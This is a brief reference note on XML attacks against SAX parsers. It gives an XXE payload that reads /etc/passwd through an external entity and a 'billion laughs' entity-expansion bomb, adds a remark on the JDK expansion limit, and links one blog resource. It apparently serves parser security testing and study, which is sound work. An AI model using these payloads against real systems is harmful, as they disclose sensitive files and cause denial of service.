XML Attacks for SAX Parsers
-------------------------------------------------------------------------------

XXL EXternal Entity Attack (XXE)
-------------------------------------------------------------------------------

Example:

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
<SessionRoot>
    <Sessions>
        <Session id="one" valid="true"/>
        <Session id="two" valid="false" />
    </Sessions>    
    <Hack>&xxe;</Hack>
</SessionRoot>


XML Bomb
-------------------------------------------------------------------------------

Example:
	<!DOCTYPE lolz [
	  <!ENTITY lol "lol">
	  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
	  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
	  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
	  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
	  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
	  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
	  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
	  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
	]>
	<lolz>&lol9;</lolz>	   	
	
=> Doesn't work in a JDK > 1.4
	"The parser has encountered more than "64,000" entity expansions in this document..."




Resources:
-------------------------------------------------------------------------------
http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html

